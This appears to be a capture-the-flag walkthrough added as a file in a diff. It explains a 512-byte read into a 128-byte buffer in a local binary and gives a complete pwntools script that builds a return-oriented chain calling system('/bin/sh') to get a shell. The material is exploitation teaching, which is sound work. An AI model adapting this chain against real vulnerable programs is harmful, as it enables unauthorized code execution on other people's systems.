@@ -1,0 +1,82 @@
+To solve this challenge using `pwntools`, we need to craft a ROP (Return-Oriented Programming) chain to exploit the buffer overflow in the `vulnerable_function` and ultimately get a shell. Here's a step-by-step guide and the corresponding code to achieve this.
+
+### Step 1: Analyze the Binary
+From the provided information:
+- The `vulnerable_function` reads up to 512 bytes into a 128-byte buffer, which is a classic buffer overflow.
+- We have access to `read` and `system` functions.
+- The binary contains several useful gadgets, including `pop rdi; ret` and `call qword ptr [rax]`.
+
+### Step 2: Set Up the Environment
+First, ensure you have `pwntools` installed. If not, you can install it using pip:
+```sh
+pip install pwntools
+```
+
+### Step 3: Write the Exploit Script
+We will use `pwntools` to:
+1. Connect to the target binary.
+2. Craft the payload with a ROP chain.
+3. Send the payload to the binary.
+
+Here's the Python script to do that:
+
+```python
+from pwn import *
+
+# Set up the context
+context.arch = 'amd64'
+context.os = 'linux'
+context.endian = 'little'
+context.log_level = 'debug'
+
+# Define the target
+binary_path = './rop'
+elf = ELF(binary_path)
+
+# Start the process
+p = process(binary_path)
+
+# Find the offset to the return address
+offset = 128 + 8  # 128 bytes for the buffer, 8 bytes for the saved rbp
+
+# Find the gadgets
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+bin_sh = next(elf.search(b'/bin/sh\x00'))
+system = elf.symbols['system']
+
+# Construct the ROP chain
+rop_chain = [
+    pop_rdi, bin_sh,
+    system
+]
+
+# Create the payload
+payload = b'A' * offset
+payload += flat(rop_chain)
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation of the Code
+1. **Context Setup**: We set up the context for `pwntools` to know we are working with a 64-bit Linux binary.
+2. **Target Definition**: We define the path to the binary and load it using `ELF`.
+3. **Process Start**: We start the binary as a process.
+4. **Offset Calculation**: We calculate the offset to the return address. The buffer size is 128 bytes, and we need to account for the 8 bytes of the saved `rbp`.
+5. **Gadgets Search**: We find the `pop rdi; ret` gadget and the address of the `/bin/sh` string.
+6. **ROP Chain Construction**: We construct the ROP chain to call `system("/bin/sh")`.
+7. **Payload Creation**: We create the payload by padding it with `A`s up to the offset and then appending the ROP chain.
+8. **Send Payload**: We send the payload to the binary.
+9. **Interactive Shell**: We interact with the shell if the exploit is successful.
+
+### Step 4: Run the Script
+Save the script to a file, for example, `exploit.py`, and run it:
+```sh
+python exploit.py
+```
+
+If everything is set up correctly, you should get a shell from the binary. Adjust the offsets and gadgets as needed based on the actual binary and environment.
